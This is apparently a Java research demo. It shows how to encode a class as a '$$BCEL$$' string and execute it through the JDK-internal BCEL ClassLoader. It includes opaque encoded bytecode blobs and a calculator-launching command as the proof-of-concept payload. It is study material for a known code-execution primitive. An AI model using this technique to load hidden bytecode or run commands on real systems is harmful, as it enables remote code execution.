package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

/**
 * @author Whoopsunix
 */
public class BCEL {
    public static void main(String[] args) throws Exception {
        /**
         * 调用 static
         */
        String exec = encode(Exec.class);
        // $$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$96$af$o$f8$adx$SL$84$Y$8f$Q$P$S$bdH$d4$88$c1$f3R7uIi$9b$d2$g$fe$91g$$j$3c$f8$D$fcQ$c6$d7J$90$e8$kv$f6$cd$9b$99$b7$bb$9f_$ef$l$A$8e$b1$a7A$85$a1$a1$8c$d5$M$w$RVU$ac$a9XW$b1$c1$90$eeHG$G$a7$M$c9zc$c0$a0t$dd$H$c1P$e8IG$5c$85$e3$a1$f0$ef$f8$d0$s$c6$e8$b9$s$b7$H$dc$97Q$3d$t$95$e0QN$e2$9eo$b5$c4$94$8f$3d$5b$b4$ce$a7$c2l3d$3a$a6$3d$8f$d6$fan$e8$9b$e2BF$9el$d4o$8e$f8$T$d7$91AV$c5$a6$8e$zl3T$5dO8$b5$p$5e$ebr$db$Mm$k$b8$7e$93$7b$9e$8e$j$ec2$94$pG$cb$e6$8eE$DL$e1$F$d2u$Y$8a$7f$H$T$f5$x$bc$k$8e$84$Z0$94$7e$a9$db$d0$J$e4$98$ae$a1Y$oX$U$95z$a3$f7OCoPD$iyP_$ea$f6$D_$3aV$7b$d9p$e3$bb$a6$98L$da$d8G$9a$fe$3aZ$J$b0$e8u$b4kT$9d$Q2$c2$d4$e1$x$d8$yn$af$d0$ae$R$82$M$KIu$3a$e9$3f$o$e4$90$t$cc$a0$b0$I8$8b$D$81$fc$h$SF$f2$F$ca$fd3$94$cbY$cce$c9$97$9a$t$g$94$V$e5d$vA$a7$9c$ie$e8$f1$3c$90$b6$Y$9fJ$df$e0$d7r$ac$g$C$A$A
        decode(exec);

        /**
         * 调用构造方法, 传参
         */
//        String execArg = encode(ExecArg.class);
//        // $$BCEL$$$l$8b$I$A$A$A$A$A$A$Am$91MO$c2$40$Q$86$df$a5$c5j$a9$96$82$e0$b7$c6$93$a0$89$8d$f1$8811$GO$f5$pb$f0$e4$a1$94M$5d$d2$PR$8a$e1$ly$e6$a2$c6$83$3f$c0$le$9c$F$o$s$d0$c3$cc$ce$3b$ef$3e3$9b$7e$ff$7c$7e$B8$c1$9e$8e$F$Uu$ac$a2$qCY$c3$9a$86u$N$h$M$Lg$o$S$e99$83R$a96$Z$d4$cb$b8$cd$ZLGD$fc$a6$l$b6x$f2$e0$b6$CR$KN$ec$b9A$d3M$84$ac$t$a2$9a$3e$8b$kC$c9$89$T$df$e6$D7$ec$G$dc$ae$P$b8w$91$f85$d2$xN$c7$7dq$ed$c0$8d$7c$bb$91$s$o$f2kr$88$e2$85mI$9ci2$e8$8d$b8$9fx$fcJH$bc1A$jK$a3$B$N$8b$g6$Nla$db$c0$Ov$Z$8aSB$7d$e0$f1n$w$e2$88$d49$db0$e4$a7$de$dbV$87$7b$v$835$95$ee$fbQ$wB$9a$a9$fb$3c$fd$xJ$95$aa3$e3$a1$zUNT$86$83y$ef$fb$t$dd$r$b1$c7$7b$bd$g$f6$91$a5$l$m$bf$M$98$7c$H$c5$r$aaN$v3$ca$d9$c3w$b0$e1$a8$adS$d4$v$83l$w$Zst2$c6$s$ca$cb$94$r$60e$Cx$o$a7B$d9$92$80$Pd$8e$de$a0$3c$beB$bd$k$92A$a5$L$s$c51$b4L$A$89$96$aaA$A$93$60y$8a$b9QO$O$b4$s$D$e4$c9$a4$9e$dc$cd$g$zU$f8$F$P$W$$$EJ$C$A$A
//        decodeArg(execArg, "open -a Calculator.app");

        /**
         * 调用方法
         */
//        String execArg = encode(ExecArg.class);
//        decodeMethod(execArg, "exec", "open -a Calculator.app");
    }

    public static String encode(Class<?> clazz) throws Exception {
        JavaClass javaClass = Repository.lookupClass(clazz);
        String s = Utility.encode(javaClass.getBytes(), true);
        String bcelStr = "$$BCEL$$" + s;
        System.out.println(bcelStr);
        return bcelStr;
    }

    public static void decode(String s) throws Exception {
        new ClassLoader().loadClass(s).newInstance();
    }

    public static void decodeArg(String s, String arg) throws Exception {
//        new ClassLoader().loadClass(s).getConstructors()[1].newInstance(arg);
        new ClassLoader().loadClass(s).getConstructor(String.class).newInstance(arg);
    }

    public static void decodeMethod(String s,String name,  String arg) throws Exception {
        Object obj = new ClassLoader().loadClass(s).newInstance();
        obj.getClass().getMethod(name, String.class).invoke(obj, arg);
    }
}
